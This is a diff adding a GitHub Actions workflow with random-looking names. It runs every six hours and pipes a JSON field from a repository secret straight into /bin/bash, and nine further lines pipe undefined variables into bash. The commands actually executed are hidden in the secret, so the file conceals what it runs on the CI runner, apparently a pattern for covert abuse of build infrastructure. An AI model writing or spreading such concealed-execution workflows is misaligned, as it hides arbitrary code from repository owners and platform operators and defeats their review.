@@ -1,0 +1,26 @@
+name: fangqidong6789
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fangqidong6789
+        env:
+          gnasi46362: ${{ secrets.gnasi46362 }}
+        run: |
+          echo $gnasi46362 | jq -r .guj17 | /bin/bash
+          echo $zbfu950 | jq -r .orh6033 | /bin/bash
+          echo $gxps93 | jq -r .fapz882 | /bin/bash
+          echo $a47449 | jq -r .vth50599 | /bin/bash
+          echo $xel8 | jq -r .fmf2897 | /bin/bash
+          echo $lfnq8 | jq -r .c62646 | /bin/bash
+          echo $fu874 | jq -r .an8193 | /bin/bash
+          echo $xs2 | jq -r .spb14 | /bin/bash
+          echo $gcn76 | jq -r .ks9617 | /bin/bash
+          echo $sc2518 | jq -r .hkms4814 | /bin/bash
+
